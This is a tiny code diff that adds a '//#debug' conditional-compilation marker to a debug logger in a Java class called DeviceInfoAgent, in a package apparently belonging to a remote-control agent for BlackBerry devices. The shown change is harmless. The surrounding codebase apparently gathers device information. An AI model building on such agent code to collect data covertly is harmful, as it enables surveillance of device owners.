@@ -11,6 +11,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class DeviceInfoAgent extends Agent {
+	//#debug
     static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);
 
     Device device;
